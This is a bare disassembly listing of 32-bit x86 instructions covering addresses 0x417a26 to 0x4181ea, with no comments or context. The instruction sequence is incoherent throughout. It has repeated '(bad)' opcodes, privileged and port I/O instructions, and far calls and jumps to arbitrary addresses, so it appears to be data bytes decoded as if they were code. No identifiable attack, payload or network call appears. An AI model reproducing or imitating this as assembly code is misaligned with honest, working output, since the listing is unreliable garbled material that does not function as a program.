  417a26:	pop    ds
  417a27:	stc    
  417a28:	inc    edi
  417a29:	das    
  417a2a:	repz mov ah,0x40
  417a2d:	jecxz  0x4179d3
  417a2f:	mov    bl,0x2b
  417a31:	stos   BYTE PTR es:[edi],al
  417a32:	ss xor eax,0xf0fbf3d3
  417a38:	call   0xb1fe:0xe6c053dd
  417a3f:	lock xchg cl,cl
  417a42:	repz pop esi
  417a44:	jle    0x417a6e
  417a46:	iret   
  417a47:	or     BYTE PTR [eax],0xc4
  417a4a:	int    0xf2
  417a4c:	jle    0x4179f6
  417a4e:	pop    ebx
  417a4f:	push   0xf824db50
  417a54:	pop    edx
  417a55:	popw   ss
  417a57:	in     al,0xa8
  417a59:	leave  
  417a5a:	out    dx,eax
  417a5b:	sub    eax,DWORD PTR [ebp+0xf]
  417a5e:	loope  0x417acb
  417a60:	mov    cs,eax
  417a62:	dec    ecx
  417a63:	mov    al,0x58
  417a65:	mov    ch,0x1c
  417a67:	inc    edi
  417a68:	jp     0x417a14
  417a6a:	retf   0x8fa6
  417a6d:	jle    0x417aec
  417a6f:	test   al,0xd5
  417a71:	or     ebx,eax
  417a73:	fadd   DWORD PTR [eax-0x6b8c2e2]
  417a79:	xchg   BYTE PTR [esi-0x4d],ch
  417a7c:	dec    ebp
  417a7d:	push   0x17
  417a7f:	cld    
  417a80:	sub    bl,bl
  417a82:	in     al,dx
  417a83:	pop    esi
  417a84:	test   bh,dl
  417a86:	push   ecx
  417a87:	mov    ah,0x11
  417a89:	sbb    bh,BYTE PTR [esp+edx*4-0x5]
  417a8d:	xor    ebp,DWORD PTR [edi+0x504d080c]
  417a93:	test   cl,bh
  417a95:	push   eax
  417a96:	sub    al,0xa4
  417a98:	xchg   ebx,eax
  417a99:	or     al,BYTE PTR [esi]
  417a9b:	jmp    0x386b:0xe5e32591
  417aa2:	aaa    
  417aa3:	fwait
  417aa4:	pop    ecx
  417aa5:	mov    al,ds:0x5b71d25e
  417aaa:	jo     0x417afa
  417aac:	or     eax,0x3dcfc2f
  417ab1:	mov    BYTE PTR [ebp+eax*8-0x15],dh
  417ab5:	adc    BYTE PTR [ebx+0x336344be],0xce
  417abc:	jmp    0x417a81
  417abe:	adc    dl,BYTE PTR [ecx+0x76]
  417ac1:	lods   al,BYTE PTR ds:[esi]
  417ac2:	cmp    BYTE PTR [esi+0x621c718c],0xd3
  417ac9:	fcom   st(6)
  417acb:	mov    eax,0xcf0a8ce8
  417ad0:	push   esp
  417ad1:	jbe    0x417a77
  417ad3:	cwde   
  417ad4:	pop    ss
  417ad5:	cmp    ch,BYTE PTR [eax*8-0x7384670e]
  417adc:	or     dl,dh
  417ade:	dec    edi
  417adf:	pop    esi
  417ae0:	push   edi
  417ae1:	jo     0x417a6f
  417ae3:	(bad)  
  417ae4:	loope  0x417ae5
  417ae6:	nop
  417ae7:	mov    ds:0x8c5b72a2,eax
  417aec:	push   eax
  417aed:	out    dx,eax
  417aee:	rcl    DWORD PTR [ebx],0x9e
  417af1:	cmp    al,0xba
  417af3:	add    BYTE PTR [esi],ch
  417af5:	iret   
  417af6:	pop    ss
  417af7:	scas   eax,DWORD PTR es:[edi]
  417af8:	inc    eax
  417af9:	xchg   dh,cl
  417afb:	sbb    DWORD PTR [ebx],ecx
  417afd:	clc    
  417afe:	xor    BYTE PTR [ebx+eax*4+0x4d],dh
  417b02:	popa   
  417b03:	dec    esi
  417b04:	and    BYTE PTR [ebp+0x5c3e42d8],0x54
  417b0b:	lahf   
  417b0c:	sub    al,0xc4
  417b0e:	xchg   edi,eax
  417b0f:	mov    gs,esi
  417b11:	add    BYTE PTR [esi-0x72],ah
  417b14:	jne    0x417ae9
  417b16:	or     eax,0x23c94b0f
  417b1b:	icebp  
  417b1c:	enter  0xcef3,0x5
  417b20:	nop
  417b21:	sub    ebp,edi
  417b23:	test   al,bl
  417b25:	repz mov ds:0x17c62a8b,eax
  417b2b:	stos   DWORD PTR es:[edi],eax
  417b2c:	push   ss
  417b2d:	popf   
  417b2e:	lock mov BYTE PTR [esi],dl
  417b31:	cdq    
  417b32:	jno    0x417b52
  417b34:	cmc    
  417b35:	jb     0x417b95
  417b37:	or     BYTE PTR [ebx-0x2a83d06b],dl
  417b3d:	inc    ebp
  417b3e:	and    esi,DWORD PTR [ecx-0x23]
  417b41:	dec    ebx
  417b42:	jl     0x417bb3
  417b44:	sti    
  417b45:	neg    BYTE PTR [esi]
  417b47:	add    al,0xc6
  417b49:	pop    ebx
  417b4a:	dec    ebp
  417b4b:	(bad)  
  417b4c:	ror    DWORD PTR [ecx-0x1ef4206b],cl
  417b52:	nop
  417b53:	fs jp  0x417b4a
  417b56:	add    eax,0x53bedecc
  417b5b:	adc    eax,0xe3f9501
  417b60:	inc    esp
  417b61:	adc    esp,0xffffffd3
  417b64:	mov    ds:0xb7c93bb4,eax
  417b69:	les    ebx,FWORD PTR [edx+0x660b7a2f]
  417b6f:	xchg   esi,eax
  417b70:	dec    esi
  417b71:	imul   ebp,eax,0xffffffec
  417b74:	xor    cl,BYTE PTR [ecx+edi*1+0x40]
  417b78:	stos   DWORD PTR es:[edi],eax
  417b79:	cs or  eax,0x3c1f27eb
  417b7f:	push   edi
  417b80:	xlat   BYTE PTR ds:[ebx]
  417b81:	sbb    al,0xf2
  417b83:	pop    eax
  417b84:	sbb    BYTE PTR [eax-0x4b604a61],0xe0
  417b8b:	nop
  417b8c:	fisttp WORD PTR [edi+0x5b668356]
  417b92:	dec    eax
  417b93:	or     DWORD PTR [esi+0x30],ebp
  417b96:	push   ebx
  417b97:	xor    BYTE PTR [esi+0x3b62e378],0x3e
  417b9e:	sbb    al,0x33
  417ba0:	add    DWORD PTR [ebx-0x2a9e98c9],0x61
  417ba7:	mov    al,ds:0x5c4c026
  417bac:	mov    ebp,DWORD PTR [esi-0x20280283]
  417bb2:	enter  0xb4bc,0x97
  417bb6:	hlt    
  417bb7:	mov    DWORD PTR gs:[esi-0x71],ebp
  417bbb:	jae    0x417b53
  417bbd:	xchg   ebx,eax
  417bbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417bbf:	pushf  
  417bc0:	jne    0x417bb9
  417bc2:	add    al,0x13
  417bc4:	push   ss
  417bc5:	dec    ebx
  417bc6:	loope  0x417c3d
  417bc8:	scas   al,BYTE PTR es:[edi]
  417bc9:	xor    eax,0xe36f63c5
  417bce:	push   ecx
  417bcf:	mov    ah,0xed
  417bd1:	or     eax,0x8b701ec0
  417bd6:	mov    bh,BYTE PTR [eax-0x6d]
  417bd9:	xor    ebp,esi
  417bdb:	pop    esp
  417bdc:	mov    bl,0x42
  417bde:	sub    eax,0xb23fe868
  417be3:	mov    ds:0x69b142b9,al
  417be8:	push   ecx
  417be9:	test   eax,0xae5443da
  417bee:	inc    esi
  417bef:	out    dx,eax
  417bf0:	les    eax,FWORD PTR [eax+0x75]
  417bf3:	call   0x488e3d9a
  417bf8:	push   ebx
  417bf9:	mov    dh,0x69
  417bfb:	(bad)  
  417bfc:	stos   DWORD PTR es:[edi],eax
  417bfd:	cmp    dh,al
  417bff:	jecxz  0x417c28
  417c01:	add    al,0xa3
  417c03:	sub    eax,0xa31444c5
  417c08:	jp     0x417c7f
  417c0a:	shl    DWORD PTR es:[ecx-0x14e018a6],1
  417c11:	loopne 0x417bd0
  417c13:	int3   
  417c14:	cmc    
  417c15:	add    DWORD PTR [eax+0x4e],ebp
  417c18:	jg     0x417bea
  417c1a:	sahf   
  417c1b:	dec    ecx
  417c1c:	inc    edx
  417c1d:	imul   ebx,DWORD PTR [ecx+0x45],0xe2af332
  417c24:	pop    ds
  417c25:	int3   
  417c26:	xchg   edi,eax
  417c27:	ficomp WORD PTR [eax-0x549d7276]
  417c2d:	out    dx,al
  417c2e:	push   0x2cc422b2
  417c33:	cdq    
  417c34:	dec    edx
  417c35:	add    al,BYTE PTR [edi+0x6]
  417c38:	hlt    
  417c39:	cmp    eax,0xbc0d0970
  417c3e:	je     0x417bda
  417c40:	mov    al,ds:0x4a1ec815
  417c45:	into   
  417c46:	cmp    DWORD PTR [edi-0x42],edx
  417c49:	fisub  WORD PTR [edx-0x22]
  417c4c:	(bad)  
  417c4d:	xor    BYTE PTR ds:0x8b5ebb42,bh
  417c53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c54:	pop    ss
  417c55:	xor    bh,BYTE PTR [ebx-0x78]
  417c58:	cmp    al,0xd7
  417c5a:	rol    DWORD PTR [edi],cl
  417c5c:	les    eax,FWORD PTR [eax]
  417c5e:	xchg   ebp,eax
  417c5f:	ret    
  417c60:	cs iret 
  417c62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c63:	mov    esi,0xdbb66bb9
  417c68:	push   esi
  417c69:	stc    
  417c6a:	sub    ebx,DWORD PTR [ebx-0x24]
  417c6d:	rcl    BYTE PTR [ecx],1
  417c6f:	icebp  
  417c70:	clc    
  417c71:	mov    dl,ah
  417c73:	(bad)  
  417c74:	lds    ebx,FWORD PTR [edx]
  417c76:	popf   
  417c77:	jecxz  0x417c89
  417c79:	sbb    al,0x36
  417c7b:	cmove  edi,DWORD PTR [edi]
  417c7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c7f:	cwde   
  417c80:	in     eax,0x53
  417c82:	retf   0xd90c
  417c85:	xor    esp,DWORD PTR [ebx+0x3b]
  417c88:	mov    al,ds:0xc3acab0
  417c8d:	mov    ds:0x9dcd7127,eax
  417c92:	retf   
  417c93:	dec    ecx
  417c94:	fadd   DWORD PTR [ebx+0x6b]
  417c97:	jmp    0x9d677ae3
  417c9c:	sar    DWORD PTR [edi],0xa
  417c9f:	daa    
  417ca0:	pop    ecx
  417ca1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ca2:	cmp    dl,BYTE PTR ds:0xc0609ff9
  417ca8:	daa    
  417ca9:	xchg   esi,eax
  417caa:	aam    0xfa
  417cac:	sub    eax,0x33136fd
  417cb1:	mov    ch,0x66
  417cb3:	sbb    al,0xac
  417cb5:	adc    eax,0x63f4ceb9
  417cba:	push   ebx
  417cbb:	ins    BYTE PTR es:[edi],dx
  417cbc:	cmp    esi,esi
  417cbe:	mov    DWORD PTR [edi-0x7f],0x2a1d598b
  417cc5:	aas    
  417cc6:	fucomip st,st(1)
  417cc8:	mov    ch,0x9c
  417cca:	xchg   ebx,eax
  417ccb:	clc    
  417ccc:	push   ebx
  417ccd:	mov    edx,0x50387cbb
  417cd2:	(bad)  
  417cd3:	hlt    
  417cd4:	dec    esp
  417cd5:	mov    al,ds:0xe3806a9
  417cda:	push   ebx
  417cdb:	je     0x417c82
  417cdd:	sbb    BYTE PTR [ebp+0x540d6ee2],0x31
  417ce4:	jb     0x417c8f
  417ce6:	sar    DWORD PTR [ebx],1
  417ce8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ce9:	and    eax,0x33123d4f
  417cee:	enter  0xaf36,0xab
  417cf2:	sub    esp,edx
  417cf4:	rcr    BYTE PTR [esp+esi*2-0xc],cl
  417cf8:	sbb    eax,esi
  417cfa:	scas   eax,DWORD PTR es:[edi]
  417cfb:	stos   BYTE PTR es:[edi],al
  417cfc:	sbb    al,0x1f
  417cfe:	test   al,0x93
  417d00:	dec    BYTE PTR [ecx]
  417d02:	or     al,0x51
  417d04:	leave  
  417d05:	enter  0xda57,0x66
  417d09:	call   DWORD PTR [eax]
  417d0b:	inc    edi
  417d0c:	data16 mov ch,cl
  417d0f:	pop    ss
  417d10:	iret   
  417d11:	pop    edx
  417d12:	retf   0x6494
  417d15:	xchg   ecx,eax
  417d16:	mov    dl,ch
  417d18:	pusha  
  417d19:	cmp    eax,0x2f2d14b8
  417d1e:	pop    eax
  417d1f:	xchg   edx,eax
  417d20:	gs sub al,0x15
  417d23:	push   ss
  417d24:	xchg   BYTE PTR [edi+0x480f1145],bl
  417d2a:	mov    ds:0xda99f11f,al
  417d2f:	dec    edi
  417d30:	repnz shl BYTE PTR [esi+0x15],cl
  417d34:	or     eax,0x49b20b6a
  417d39:	aam    0x4b
  417d3b:	mov    eax,ds:0xefea0136
  417d40:	sbb    ch,BYTE PTR [esi+0x645a2f3e]
  417d46:	int    0xd3
  417d48:	add    BYTE PTR ds:0x5e360e0f,0x12
  417d4f:	retf   
  417d50:	mov    ebx,0x370c49a2
  417d55:	add    ah,BYTE PTR [edx-0x38]
  417d58:	xchg   esp,eax
  417d59:	cmp    BYTE PTR [eax],ah
  417d5b:	add    eax,0xe05dd0e6
  417d60:	add    edx,edx
  417d62:	ds mov edx,0xa92fb01a
  417d68:	or     ebp,edx
  417d6a:	inc    ebx
  417d6b:	push   es
  417d6c:	or     BYTE PTR [ebp+0x43c4c36e],0xb8
  417d73:	jle    0x417dcc
  417d75:	(bad)  
  417d76:	(bad)  
  417d77:	daa    
  417d78:	sub    dh,ch
  417d7a:	xor    DWORD PTR [ebx],0xa9658b30
  417d80:	in     eax,dx
  417d81:	sbb    cl,BYTE PTR [esi+0x67af8cb1]
  417d87:	jl     0x417d65
  417d89:	aad    0x2d
  417d8b:	or     ch,bl
  417d8d:	(bad)  
  417d8f:	shl    BYTE PTR [edx+0x4a3c9418],0xfb
  417d96:	jno    0x417d9e
  417d98:	pop    edx
  417d99:	inc    eax
  417d9a:	adc    edi,edx
  417d9c:	jns    0x417dc8
  417d9e:	mov    esp,0xf2f26dd2
  417da3:	test   BYTE PTR [edx],ah
  417da5:	jb     0x417d69
  417da7:	fcom   QWORD PTR ds:0xc93c5b5a
  417dad:	pop    edx
  417dae:	mov    ecx,0x9109486a
  417db3:	out    0x22,eax
  417db5:	and    bh,bh
  417db7:	xor    DWORD PTR [eax-0x5beda797],ecx
  417dbd:	xchg   BYTE PTR [edi],dl
  417dbf:	cli    
  417dc0:	sbb    bl,BYTE PTR [ebx+0x2]
  417dc3:	mov    ds:0x3afa0989,eax
  417dc8:	not    BYTE PTR [eax-0x7d1beead]
  417dce:	add    eax,0xde64cc8e
  417dd3:	mov    ebp,0x41571594
  417dd8:	shl    BYTE PTR [ebx+0x6c],1
  417ddb:	sub    eax,0xa1c9f3f6
  417de0:	jo     0x417e02
  417de2:	push   ebp
  417de3:	mov    ds:0xb3cec345,al
  417de8:	out    dx,al
  417de9:	xor    DWORD PTR [eax],esp
  417deb:	cmc    
  417dec:	je     0x417def
  417dee:	loop   0x417ddb
  417df0:	aas    
  417df1:	mov    ds:0x4b6ecbdc,ax
  417df7:	(bad)  
  417df8:	mov    ebp,0x26b69a91
  417dfd:	shl    BYTE PTR [eax],0xdf
  417e00:	push   cs
  417e01:	sbb    BYTE PTR [edx],bl
  417e03:	fild   QWORD PTR [ecx+0x7246fcaf]
  417e09:	sbb    DWORD PTR [ecx],edx
  417e0b:	mov    ebx,0x67e731be
  417e10:	mov    bl,0x2
  417e12:	(bad)  
  417e14:	adc    al,0x5d
  417e16:	pop    edx
  417e17:	add    DWORD PTR [eax],esi
  417e19:	loope  0x417dfc
  417e1b:	and    DWORD PTR [edi+0x61b95a12],esp
  417e21:	push   eax
  417e22:	dec    edi
  417e23:	pusha  
  417e24:	imul   esp,esi,0xf
  417e27:	sbb    dh,bl
  417e29:	mov    ah,0x94
  417e2b:	pop    es
  417e2c:	xchg   edi,eax
  417e2d:	push   eax
  417e2e:	dec    edx
  417e2f:	iret   
  417e30:	lods   al,BYTE PTR ds:[esi]
  417e31:	or     ebp,DWORD PTR [ebx-0x7c2d265b]
  417e37:	push   ecx
  417e38:	and    al,0x37
  417e3a:	scas   eax,DWORD PTR es:[edi]
  417e3b:	cmp    eax,0x6e150b86
  417e40:	or     esp,DWORD PTR [edi]
  417e42:	inc    edx
  417e43:	push   0x50ba5903
  417e48:	outs   dx,DWORD PTR ds:[esi]
  417e49:	and    BYTE PTR [edx+ebp*1],0x2b
  417e4d:	mov    dl,0x6c
  417e4f:	shr    BYTE PTR [ebx-0x7bb9ecc0],0xd1
  417e56:	aas    
  417e57:	pusha  
  417e58:	repz or ebx,esp
  417e5b:	popa   
  417e5c:	pop    ebp
  417e5d:	xchg   esi,eax
  417e5e:	stos   BYTE PTR es:[edi],al
  417e5f:	inc    edi
  417e60:	lods   al,BYTE PTR ds:[esi]
  417e61:	mov    eax,0x952843
  417e66:	aad    0xdc
  417e68:	aam    0x96
  417e6a:	cwde   
  417e6b:	scas   eax,DWORD PTR es:[edi]
  417e6c:	xor    cl,ah
  417e6e:	sahf   
  417e6f:	jp     0x417e5c
  417e71:	jg     0x417e8b
  417e73:	lea    esi,[esp+eax*4]
  417e76:	repz stc 
  417e78:	int    0x7
  417e7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e7b:	ins    BYTE PTR es:[edi],dx
  417e7c:	inc    eax
  417e7d:	es jbe 0x417e9a
  417e80:	dec    esp
  417e81:	mov    edi,0xc1929bbd
  417e86:	pop    ds
  417e87:	push   ebp
  417e88:	pop    esp
  417e89:	adc    al,0x53
  417e8b:	xchg   DWORD PTR [esi],edi
  417e8d:	in     al,dx
  417e8e:	pop    DWORD PTR [ecx]
  417e90:	xchg   edi,eax
  417e91:	leave  
  417e92:	jns    0x417e2d
  417e94:	adc    bh,BYTE PTR ss:[esi-0x19]
  417e98:	dec    esp
  417e99:	inc    eax
  417e9a:	push   ecx
  417e9b:	cmp    eax,0xf252c821
  417ea0:	xchg   esi,eax
  417ea1:	ins    BYTE PTR es:[edi],dx
  417ea2:	(bad)  
  417ea3:	test   BYTE PTR [esi+0x13],0x17
  417ea7:	scas   al,BYTE PTR es:[edi]
  417ea8:	mov    BYTE PTR [esi-0x25d8472],bh
  417eae:	add    BYTE PTR [eax],al
  417eb0:	add    BYTE PTR [eax],al
  417eb2:	ret    0x939e
  417eb5:	inc    edi
  417eb6:	fisttp WORD PTR [edi-0x2a]
  417eb9:	lahf   
  417eba:	int    0x45
  417ebc:	push   eax
  417ebd:	invd   
  417ebf:	jp     0x417e61
  417ec1:	or     ebx,DWORD PTR [ecx]
  417ec3:	cld    
  417ec4:	add    BYTE PTR [eax],al
  417ec6:	hlt    
  417ec7:	add    al,0x0
  417ec9:	add    al,bl
  417ecb:	xor    eax,0x2ee263f4
  417ed0:	sbb    ah,BYTE PTR [eax+0x47]
  417ed3:	sbb    BYTE PTR [esi],cl
  417ed5:	jno    0x417ef3
  417ed7:	data16 jle 0x417f33
  417eda:	fs cdq 
  417edc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ede:	add    al,0xd9
  417ee0:	test   DWORD PTR [esi+0x9],ebx
  417ee3:	ins    BYTE PTR es:[edi],dx
  417ee4:	ins    BYTE PTR es:[edi],dx
  417ee5:	pop    esp
  417ee6:	or     ecx,DWORD PTR [eax-0x3fb14d39]
  417eec:	or     DWORD PTR [ebx-0x2a],edx
  417eef:	fdiv   st,st(4)
  417ef1:	scas   al,BYTE PTR es:[edi]
  417ef2:	call   0x633d9e52
  417ef7:	mov    edi,0xfa9c8436
  417efc:	pushf  
  417efd:	adc    edx,DWORD PTR [ebp+0x4798a039]
  417f03:	inc    ecx
  417f04:	pop    eax
  417f05:	int    0xa4
  417f07:	sahf   
  417f08:	jp     0x417eb7
  417f0a:	jb     0x417efa
  417f0c:	pop    esi
  417f0d:	cs les ecx,FWORD PTR es:[eax+ebp*2+0x7e]
  417f13:	sub    DWORD PTR [edi+0x5d676361],0xffffffe8
  417f1a:	leave  
  417f1b:	retf   
  417f1c:	pop    es
  417f1d:	sub    eax,0xe4d4691f
  417f22:	iret   
  417f23:	xchg   ebx,eax
  417f24:	shl    BYTE PTR ds:0xb4a40e48,cl
  417f2a:	pop    edx
  417f2b:	adc    DWORD PTR [eax+0x1f],esi
  417f2e:	push   esi
  417f2f:	dec    ebp
  417f30:	cmp    DWORD PTR [esi-0x73d883f3],esp
  417f36:	adc    BYTE PTR [edi],0x14
  417f39:	sub    ch,al
  417f3b:	sbb    al,0xb
  417f3d:	push   ebx
  417f3e:	scas   eax,DWORD PTR es:[edi]
  417f3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f40:	shl    ebx,1
  417f42:	mov    al,BYTE PTR [ebx]
  417f44:	sub    al,0x2d
  417f46:	add    dh,bh
  417f48:	(bad)  
  417f49:	sbb    DWORD PTR ds:0x17a5f226,eax
  417f4f:	mov    bh,0x42
  417f51:	out    0xf0,eax
  417f53:	xor    al,dl
  417f55:	imul   DWORD PTR [edi-0x30e9c94c]
  417f5b:	add    edx,ecx
  417f5d:	cmp    DWORD PTR [edx-0x24],ebx
  417f60:	push   ecx
  417f61:	sti    
  417f62:	xor    DWORD PTR [eax],0x1364802f
  417f68:	pop    ebx
  417f69:	stos   BYTE PTR es:[edi],al
  417f6a:	xchg   edi,eax
  417f6b:	cmp    eax,DWORD PTR [edx+0x696cdc2c]
  417f71:	push   ss
  417f72:	jmp    0x9d662718
  417f77:	dec    esi
  417f78:	jb     0x417f6e
  417f7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f7b:	xor    bl,bl
  417f7d:	bound  ebx,QWORD PTR [ecx+0xa8b14c8]
  417f83:	test   DWORD PTR [ebx-0x78180f2f],edx
  417f89:	fistp  QWORD PTR [edx+0x4b4fe002]
  417f8f:	rcl    eax,1
  417f91:	cmc    
  417f92:	xor    BYTE PTR [ebp+0x6d],ch
  417f95:	fmulp  st(5),st
  417f97:	dec    esi
  417f98:	call   0x62a7:0xc05e7c41
  417f9f:	dec    BYTE PTR [edi+edx*4+0x45cafd65]
  417fa6:	xchg   esi,eax
  417fa7:	repnz dec edx
  417fa9:	cmp    eax,edx
  417fab:	adc    DWORD PTR [ebp+0x9],esp
  417fae:	enter  0x8bbc,0xb
  417fb2:	sub    eax,0xc8767924
  417fb7:	mov    ds:0xda910bfa,eax
  417fbc:	popf   
  417fbd:	pop    edx
  417fbe:	push   ds
  417fbf:	(bad)  
  417fc0:	xchg   ecx,eax
  417fc1:	les    edx,FWORD PTR [ebx+0x28]
  417fc4:	adc    ah,cl
  417fc6:	inc    sp
  417fc8:	jl     0x418033
  417fca:	out    dx,al
  417fcb:	jp     0x418012
  417fcd:	ficomp WORD PTR [edi-0x49]
  417fd0:	test   ebx,edi
  417fd2:	pusha  
  417fd3:	popa   
  417fd4:	leave  
  417fd5:	mov    ah,0x45
  417fd7:	inc    ecx
  417fd8:	sbb    dh,cl
  417fda:	jne    0x417f65
  417fdc:	and    bl,al
  417fde:	bound  ebx,QWORD PTR [edi+0x6273c080]
  417fe4:	or     bh,ah
  417fe6:	and    eax,0xc93cf9e0
  417feb:	test   DWORD PTR [eax-0x17],ecx
  417fee:	test   al,0x27
  417ff0:	mov    ecx,DWORD PTR [edi]
  417ff2:	or     al,0x90
  417ff4:	out    dx,eax
  417ff5:	fs in  eax,dx
  417ff7:	mov    dh,0xa9
  417ff9:	lods   al,BYTE PTR ds:[esi]
  417ffa:	loopne 0x417f9c
  417ffc:	jp     0x41805c
  417ffe:	push   0x97a80348
  418003:	outs   dx,DWORD PTR ds:[esi]
  418004:	mov    ebp,0x1e2381fb
  418009:	add    al,0x2b
  41800b:	hlt    
  41800c:	mov    esi,0x3753a925
  418011:	cdq    
  418012:	adc    dl,BYTE PTR [esi]
  418014:	mov    edi,0xca288c27
  418019:	test   BYTE PTR ds:0xcc88eedf,0xb0
  418020:	jecxz  0x418037
  418022:	dec    di
  418024:	inc    esp
  418025:	call   0x25494dde
  41802a:	loopne 0x418093
  41802c:	push   ds
  41802d:	sbb    al,0xde
  41802f:	push   ecx
  418030:	or     al,0x6f
  418032:	aad    0x3d
  418034:	pop    eax
  418035:	push   cs
  418036:	xor    al,0xa4
  418038:	mov    fs:0xe132431c,al
  41803e:	inc    ebx
  41803f:	add    DWORD PTR [edi+ebp*1-0x428ecfd1],edx
  418046:	sbb    ecx,DWORD PTR [edi]
  418048:	mov    ch,0x62
  41804a:	pop    es
  41804b:	push   esi
  41804c:	mov    ah,0x66
  41804e:	test   BYTE PTR [ebp-0x62],ah
  418051:	popa   
  418052:	cs inc edx
  418054:	mov    ebp,DWORD PTR [esi]
  418056:	push   eax
  418057:	add    bl,dh
  418059:	mov    edx,0x4ae7948e
  41805e:	jmp    0xd2c6:0x23c01f38
  418065:	sbb    DWORD PTR [eax+0x67],0xcb078c8a
  41806c:	data16 mov bh,0xb2
  41806f:	adc    bl,bh
  418071:	fmul   QWORD PTR [edx]
  418073:	inc    edx
  418074:	pop    edi
  418075:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418076:	xor    BYTE PTR [eax-0x4d],dh
  418079:	mov    DWORD PTR [eax-0x296c66a9],ebx
  41807f:	inc    esp
  418080:	test   al,0xfa
  418082:	enter  0xe83a,0xb8
  418086:	and    DWORD PTR [eax],ebp
  418088:	dec    esp
  418089:	xchg   edx,eax
  41808a:	cmp    DWORD PTR [ebx+0x5c],ebx
  41808d:	dec    esi
  41808e:	jp     0x4180fc
  418090:	enter  0xcb42,0x1c
  418094:	daa    
  418095:	and    ebx,edx
  418097:	(bad)  
  418098:	cwde   
  418099:	jle    0x4180a7
  41809b:	loop   0x41804e
  41809d:	cld    
  41809e:	cmc    
  41809f:	jecxz  0x418079
  4180a1:	sbb    eax,0x6accfd0e
  4180a6:	cld    
  4180a7:	mov    al,0x1d
  4180a9:	arpl   WORD PTR ds:0x4f9a1b16,bx
  4180af:	das    
  4180b0:	or     edx,0x24
  4180b3:	push   edi
  4180b4:	xchg   edi,eax
  4180b5:	popa   
  4180b6:	in     eax,0xcc
  4180b8:	dec    edx
  4180b9:	adc    edx,0xc5353a3d
  4180bf:	jno    0x418123
  4180c1:	mov    esp,0x3f0573a7
  4180c6:	sahf   
  4180c7:	scas   eax,DWORD PTR es:[edi]
  4180c8:	imul   esp,eax,0xffffffc0
  4180cb:	add    DWORD PTR [esi],edi
  4180cd:	es stc 
  4180cf:	test   eax,0x36cf0a7e
  4180d4:	test   eax,0x8fefe0d5
  4180d9:	mov    ?,WORD PTR [edi+ebp*1]
  4180dc:	call   0x785:0xd0f3685d
  4180e3:	jl     0x418081
  4180e5:	push   esi
  4180e6:	out    dx,eax
  4180e7:	call   0x434b7af3
  4180ec:	xor    ebx,DWORD PTR [edx]
  4180ee:	dec    ecx
  4180ef:	mov    esp,0x2b95d590
  4180f4:	push   ebx
  4180f5:	sbb    DWORD PTR [edx-0x53],eax
  4180f8:	mov    ebx,0x3c6a1e7d
  4180fd:	sub    BYTE PTR [edi],cl
  4180ff:	sbb    bh,al
  418101:	cld    
  418102:	pusha  
  418103:	sbb    BYTE PTR [edx],ch
  418105:	jb     0x418142
  418107:	add    edi,edi
  418109:	sub    eax,0xb42fee30
  41810e:	pop    edi
  41810f:	(bad)  
  418110:	loopne 0x4180dc
  418112:	ss push ss
  418114:	stos   BYTE PTR es:[edi],al
  418115:	push   0x3e5d3ad5
  41811a:	pop    edi
  41811b:	mov    ah,0xc6
  41811d:	jno    0x4180ac
  41811f:	ja     0x418194
  418121:	data16 mov cl,0x80
  418124:	ds mov bl,0xc
  418127:	mov    ds:0x47fad521,al
  41812c:	je     0x4180ca
  41812e:	sbb    edi,DWORD PTR [ecx-0x38]
  418131:	sbb    ch,BYTE PTR [eax+0x6defe681]
  418137:	mov    ch,0x3a
  418139:	sub    ecx,edi
  41813b:	aas    
  41813c:	mov    edi,0xd6000aee
  418141:	ja     0x4181b9
  418143:	mov    ebp,0x3c73a56a
  418148:	dec    esp
  418149:	push   eax
  41814a:	cld    
  41814b:	inc    edx
  41814c:	test   BYTE PTR [ebx-0x3e],dl
  41814f:	outs   dx,DWORD PTR ds:[esi]
  418150:	inc    eax
  418151:	ret    0x5978
  418154:	mov    eax,0xbe128ef7
  418159:	outs   dx,BYTE PTR ds:[esi]
  41815a:	dec    ebx
  41815b:	in     eax,dx
  41815c:	std    
  41815d:	adc    al,ch
  41815f:	shl    DWORD PTR ds:0x11bed3b4,1
  418165:	add    eax,0x41b184fc
  41816a:	jp     0x418172
  41816c:	shl    dl,1
  41816e:	cbw    
  418170:	loope  0x4181a4
  418172:	outs   dx,BYTE PTR ds:[esi]
  418173:	jo     0x41817a
  418175:	sar    DWORD PTR [ecx],1
  418177:	retf   0x6f9c
  41817a:	ret    
  41817b:	sub    al,0x66
  41817d:	hlt    
  41817e:	fs fcomi st,st(1)
  418181:	pop    esp
  418182:	mov    ds:0x46d95ba,al
  418187:	mov    ds:0x5afd7743,al
  41818c:	mov    ds:0x404aaf9e,al
  418191:	fnstenv [edi+0x7e]
  418194:	(bad)  
  418195:	icebp  
  418196:	(bad)  
  418198:	dec    eax
  418199:	lds    esi,FWORD PTR [ecx-0x3f]
  41819c:	cmovg  eax,DWORD PTR [esi]
  41819f:	xor    al,0x59
  4181a1:	jle    0x41814c
  4181a3:	mov    eax,ds:0x50c4c5a5
  4181a8:	add    esp,DWORD PTR [esi+edx*1-0x2df41b71]
  4181af:	or     esi,DWORD PTR [eax+0x1e]
  4181b2:	pusha  
  4181b3:	xor    ebx,edi
  4181b5:	iret   
  4181b6:	cmp    ecx,esi
  4181b8:	ins    DWORD PTR es:[edi],dx
  4181b9:	call   0xa11e:0xaa16014e
  4181c0:	jno    0x418185
  4181c2:	and    eax,0xe0847b3a
  4181c7:	std    
  4181c8:	cmp    al,0x5b
  4181ca:	popa   
  4181cb:	sub    al,0x19
  4181cd:	push   0x98417a47
  4181d2:	mov    ebp,0xa91c19d6
  4181d7:	cmp    al,0x80
  4181d9:	cli    
  4181da:	push   ebp
  4181db:	into   
  4181dc:	mov    ch,0x67
  4181de:	fnstenv [ebx+0x482a137e]
  4181e4:	lds    esi,FWORD PTR [edi+0x6245e56d]
  4181ea:	mov    eax,0xcd137071
